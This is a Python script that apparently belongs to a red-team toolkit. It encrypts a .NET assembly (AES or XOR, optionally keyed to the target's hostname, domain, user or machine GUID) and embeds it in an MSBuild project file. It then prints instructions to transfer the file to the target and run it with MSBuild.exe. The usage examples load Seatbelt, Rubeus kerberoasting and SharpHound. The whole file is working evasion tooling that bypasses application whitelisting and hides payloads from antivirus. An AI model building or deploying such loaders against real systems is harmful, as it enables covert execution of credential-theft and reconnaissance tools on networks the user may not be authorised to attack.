#!/usr/bin/env python3
"""
build_msbuild.py -- Encrypts a .NET assembly and injects into msbuild_payload.csproj

Usage:
  python build_msbuild.py <assembly_path> [options] [-- <assembly_args>...]

  Everything after -- is passed as arguments to the loaded assembly's Main()
  or to the target method if --type/--method are specified.

Examples:
  python build_msbuild.py Seatbelt.exe -- -group=all
  python build_msbuild.py Seatbelt.exe -e xor -- -group=all
  python build_msbuild.py Rubeus.exe -e aes -- kerberoast
  python build_msbuild.py SharpHound.exe -o ready.csproj -- -c All
  python build_msbuild.py MyDll.dll --type Namespace.Class --method Run
  python build_msbuild.py Seatbelt.exe --keying hostname=WORKSTATION01,domain=CORP -- -group=all
"""

import argparse
import base64
import hashlib
import os
import sys

KEYING_PROPERTIES = ("hostname", "domain", "user", "machineguid")


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def aes_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import padding
    except ImportError:
        print("[-] AES encryption requires the 'cryptography' package.", file=sys.stderr)
        print("    Install with: pip install cryptography", file=sys.stderr)
        print("    Or use -e xor for XOR encryption (no dependencies).", file=sys.stderr)
        sys.exit(1)

    padder = padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    return encryptor.update(padded) + encryptor.finalize()


def parse_keying(spec: str) -> dict:
    """Parse keying spec like 'hostname=WORKSTATION01,domain=CORP' into a dict."""
    result = {}
    for pair in spec.split(","):
        pair = pair.strip()
        if "=" not in pair:
            print(f"[-] Invalid keying spec: {pair} (expected name=value)", file=sys.stderr)
            sys.exit(1)
        name, value = pair.split("=", 1)
        name = name.strip().lower()
        if name not in KEYING_PROPERTIES:
            print(f"[-] Unknown keying property: {name}", file=sys.stderr)
            print(f"    Valid: {', '.join(KEYING_PROPERTIES)}", file=sys.stderr)
            sys.exit(1)
        result[name] = value.strip()
    return result


def derive_key(salt: bytes, keying: dict) -> bytes:
    """Derive AES-256 key from salt + sorted environment properties via SHA-256."""
    parts = []
    for name in sorted(keying.keys()):
        parts.append(f"{name}={keying[name].upper()}\n")
    keying_str = "".join(parts)
    return hashlib.sha256(salt + keying_str.encode("utf-8")).digest()


def patch_template_for_xor(template: str) -> str:
    """Replace AES decrypt with XOR decrypt in the template for XOR mode."""

    aes_method = (
        "    static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv)\n"
        "    {\n"
        "        using (RijndaelManaged aes = new RijndaelManaged())\n"
        "        {\n"
        "            aes.Key = key;\n"
        "            aes.IV = iv;\n"
        "            aes.Mode = CipherMode.CBC;\n"
        "            aes.Padding = PaddingMode.PKCS7;\n"
        "            ICryptoTransform decryptor = aes.CreateDecryptor();\n"
        "            return decryptor.TransformFinalBlock(data, 0, data.Length);\n"
        "        }\n"
        "    }"
    )

    xor_method = (
        "    static byte[] XorDecrypt(byte[] data, byte[] key)\n"
        "    {\n"
        "        byte[] result = new byte[data.Length];\n"
        "        for (int i = 0; i < data.Length; i++)\n"
        "            result[i] = (byte)(data[i] ^ key[i % key.Length]);\n"
        "        return result;\n"
        "    }"
    )

    template = template.replace(aes_method, xor_method)

    # Remove IV field
    template = template.replace(
        '    static string IV_B64 = "YOURIVHERE";\n', ""
    )

    # Remove keying fields (not supported in XOR mode)
    template = template.replace(
        '    static string KEYING = "YOURKEYINGHERE";\n', ""
    )
    template = template.replace(
        '    static string SALT_B64 = "YOURSALTHERE";\n', ""
    )

    # Remove DeriveKey method
    derive_start = "    static byte[] DeriveKey(string saltB64, string keying)\n    {"
    derive_end = "    }\n\n    static string ENCRYPTED_B64"
    if derive_start in template:
        idx_start = template.index(derive_start)
        idx_end = template.index(derive_end)
        template = template[:idx_start] + "    static string ENCRYPTED_B64" + template[idx_end + len(derive_end):]

    # Simplify key resolution — remove keying branch, just use KEY_B64
    template = template.replace(
        "            byte[] key;\n"
        "            if (KEYING.Length > 0)\n"
        "                key = DeriveKey(SALT_B64, KEYING);\n"
        "            else\n"
        "                key = Convert.FromBase64String(KEY_B64);\n"
        "            byte[] iv = Convert.FromBase64String(IV_B64);\n"
        "\n"
        "            byte[] clearAssembly;\n"
        "            try\n"
        "            {\n"
        "                clearAssembly = AesDecrypt(encrypted, key, iv);\n"
        "            }\n"
        "            catch (CryptographicException)\n"
        "            {\n"
        '                Console.Error.WriteLine("Decryption failed -- key mismatch (wrong target?)");\n'
        "                return true;\n"
        "            }",
        "            byte[] key = Convert.FromBase64String(KEY_B64);\n"
        "            byte[] clearAssembly = XorDecrypt(encrypted, key);",
    )

    return template


def main():
    argv = sys.argv[1:]
    assembly_args = []
    if "--" in argv:
        split_idx = argv.index("--")
        assembly_args = argv[split_idx + 1:]
        argv = argv[:split_idx]

    parser = argparse.ArgumentParser(
        description="Encrypt a .NET assembly and inject into msbuild_payload.csproj"
    )
    parser.add_argument("assembly", help="Path to .NET assembly (.exe or .dll)")
    parser.add_argument(
        "-e", "--encryption", choices=["aes", "xor"], default="aes",
        help="Encryption method: aes (AES-256-CBC, default) or xor"
    )
    parser.add_argument(
        "--key", help="Encryption key as hex (32 bytes for AES, any length for XOR)"
    )
    parser.add_argument(
        "--iv", help="AES IV as hex (16 bytes / 32 hex chars, ignored with -e xor)"
    )
    parser.add_argument(
        "--keying",
        help="Environmental keying: derive AES key from target properties. "
             "Format: name=value,name=value. "
             "Properties: hostname, domain, user, machineguid. "
             "Example: --keying hostname=WS01,domain=CORP"
    )
    parser.add_argument(
        "--type",
        help="Fully qualified type name to invoke (e.g. Namespace.Class). Required for DLLs without an entry point."
    )
    parser.add_argument(
        "--method",
        help="Method name to invoke on --type (e.g. Execute). Required with --type."
    )
    parser.add_argument("-o", "--output", help="Output file (default: msbuild_ready.csproj)")
    parser.add_argument("--template", help="Template csproj (default: msbuild_payload.csproj)")
    args = parser.parse_args(argv)

    # Validate --type and --method are used together
    if (args.type is None) != (args.method is None):
        print("[-] --type and --method must be specified together.", file=sys.stderr)
        sys.exit(1)

    # Validate --keying constraints
    if args.keying and args.encryption == "xor":
        print("[-] --keying requires AES encryption (cannot use with -e xor).", file=sys.stderr)
        sys.exit(1)
    if args.keying and args.key:
        print("[-] --keying and --key are mutually exclusive.", file=sys.stderr)
        sys.exit(1)

    script_dir = os.path.dirname(os.path.abspath(__file__))
    template_path = args.template or os.path.join(script_dir, "msbuild_payload.csproj")
    output_path = args.output or os.path.join(script_dir, "msbuild_ready.csproj")

    if not os.path.exists(args.assembly):
        print(f"[-] Assembly not found: {args.assembly}", file=sys.stderr)
        sys.exit(1)

    if not os.path.exists(template_path):
        print(f"[-] Template not found: {template_path}", file=sys.stderr)
        sys.exit(1)

    with open(args.assembly, "rb") as f:
        assembly_bytes = f.read()
    print(f"[*] Assembly: {args.assembly} ({len(assembly_bytes)} bytes)", file=sys.stderr)

    with open(template_path, "r") as f:
        template = f.read()

    # --- Encryption ---

    if args.encryption == "xor":
        if args.key:
            key = bytes.fromhex(args.key)
        else:
            key = os.urandom(16)

        print(f"[*] Mode: XOR", file=sys.stderr)
        print(f"[*] XOR key: {key.hex()}", file=sys.stderr)

        encrypted = xor_encrypt(assembly_bytes, key)
        template = patch_template_for_xor(template)

        encrypted_b64 = base64.b64encode(encrypted).decode("ascii")
        key_b64 = base64.b64encode(key).decode("ascii")

        template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
        template = template.replace('"YOURKEYHERE"', f'"{key_b64}"')

    elif args.keying:
        # AES with environmental keying
        keying = parse_keying(args.keying)
        salt = os.urandom(16)
        key = derive_key(salt, keying)

        if args.iv:
            iv = bytes.fromhex(args.iv)
            if len(iv) != 16:
                print(f"[-] AES IV must be 16 bytes (32 hex chars), got {len(iv)}", file=sys.stderr)
                sys.exit(1)
        else:
            iv = os.urandom(16)

        keying_names = ",".join(sorted(keying.keys()))

        print(f"[*] Mode: AES-256-CBC + environmental keying", file=sys.stderr)
        print(f"[*] Keying: {keying_names}", file=sys.stderr)
        for name in sorted(keying.keys()):
            print(f"[*]   {name} = {keying[name]}", file=sys.stderr)
        print(f"[*] Salt:    {salt.hex()}", file=sys.stderr)
        print(f"[*] Derived: {key.hex()}", file=sys.stderr)
        print(f"[*] AES IV:  {iv.hex()}", file=sys.stderr)

        encrypted = aes_encrypt(assembly_bytes, key, iv)

        encrypted_b64 = base64.b64encode(encrypted).decode("ascii")
        salt_b64 = base64.b64encode(salt).decode("ascii")
        iv_b64 = base64.b64encode(iv).decode("ascii")

        template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
        template = template.replace('"YOURKEYHERE"', '""')
        template = template.replace('"YOURIVHERE"', f'"{iv_b64}"')
        template = template.replace('"YOURKEYINGHERE"', f'"{keying_names}"')
        template = template.replace('"YOURSALTHERE"', f'"{salt_b64}"')

    else:
        # AES-256-CBC with static key (default)
        if args.key:
            key = bytes.fromhex(args.key)
            if len(key) != 32:
                print(
                    f"[-] AES-256 key must be 32 bytes (64 hex chars), got {len(key)}",
                    file=sys.stderr,
                )
                sys.exit(1)
        else:
            key = os.urandom(32)

        if args.iv:
            iv = bytes.fromhex(args.iv)
            if len(iv) != 16:
                print(
                    f"[-] AES IV must be 16 bytes (32 hex chars), got {len(iv)}",
                    file=sys.stderr,
                )
                sys.exit(1)
        else:
            iv = os.urandom(16)

        print(f"[*] Mode: AES-256-CBC", file=sys.stderr)
        print(f"[*] AES key: {key.hex()}", file=sys.stderr)
        print(f"[*] AES IV:  {iv.hex()}", file=sys.stderr)

        encrypted = aes_encrypt(assembly_bytes, key, iv)

        encrypted_b64 = base64.b64encode(encrypted).decode("ascii")
        key_b64 = base64.b64encode(key).decode("ascii")
        iv_b64 = base64.b64encode(iv).decode("ascii")

        template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
        template = template.replace('"YOURKEYHERE"', f'"{key_b64}"')
        template = template.replace('"YOURIVHERE"', f'"{iv_b64}"')
        template = template.replace('"YOURKEYINGHERE"', '""')
        template = template.replace('"YOURSALTHERE"', '""')

    print(f"[*] Encrypted payload: {len(encrypted_b64)} chars base64", file=sys.stderr)

    # --- Invocation target ---

    if args.type and args.method:
        template = template.replace('"YOURTYPEHERE"', f'"{args.type}"')
        template = template.replace('"YOURMETHODHERE"', f'"{args.method}"')
        print(f"[*] Target: {args.type}.{args.method}()", file=sys.stderr)
    else:
        template = template.replace('"YOURTYPEHERE"', '""')
        template = template.replace('"YOURMETHODHERE"', '""')
        print(f"[*] Target: EntryPoint (auto)", file=sys.stderr)

    # --- Assembly args ---

    if assembly_args:
        args_lines = []
        for arg in assembly_args:
            escaped = arg.replace("\\", "\\\\").replace('"', '\\"')
            args_lines.append(f'        "{escaped}",')
        args_str = "\n".join(args_lines)
        template = template.replace("        // YOURARGS", args_str)

    # Write as pure ASCII
    template = template.encode("ascii", errors="ignore").decode("ascii")
    with open(output_path, "w", encoding="ascii") as f:
        f.write(template)

    size_kb = os.path.getsize(output_path) / 1024
    print(f"[+] Written: {output_path} ({size_kb:.0f} KB)", file=sys.stderr)
    print(f"[*] Transfer to target and run:", file=sys.stderr)
    print(
        f"    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"
        f" {os.path.basename(output_path)}",
        file=sys.stderr,
    )


if __name__ == "__main__":
    main()
